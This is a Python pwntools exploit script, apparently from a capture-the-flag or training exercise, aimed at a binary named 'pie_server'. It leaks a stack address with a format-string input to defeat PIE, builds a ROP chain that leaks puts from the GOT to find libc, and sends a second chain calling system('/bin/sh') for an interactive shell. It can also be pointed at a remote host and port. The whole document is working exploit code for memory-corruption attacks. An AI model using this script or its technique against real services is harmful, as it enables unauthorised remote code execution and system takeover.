from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pie_server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local

# Offset to RIP, found manually with GDB
offset = 264

# Start program
io = start()

# Leak 15th address from stack (main+44)
io.sendlineafter(b':', '%{}$p'.format(15), 16)
io.recvuntil(b'Hello ')  # Address will follow
leaked_addr = int(io.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

# Now calculate the PIEBASE
elf.address = leaked_addr - 0x1224
info("piebase: %#x", elf.address)

# Create a ROP object to handle complexities
rop = ROP(elf)

# Payload to leak libc function
rop.puts(elf.got.puts)
rop.vuln()
# pprint(rop.dump())

# Send the payload
io.sendlineafter(b':P', flat({offset: rop.chain()}))

io.recvlines(2)  # Blank line

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Reset ROP object with libc binary
rop = ROP(libc)

# Call ROP system, passing location of "/bin/sh" string
rop.system(next(libc.search(b'/bin/sh\x00')))
# pprint(rop.dump())

# Send the payload
io.sendline(flat({offset: rop.chain()}))

# Got Shell?
io.interactive()
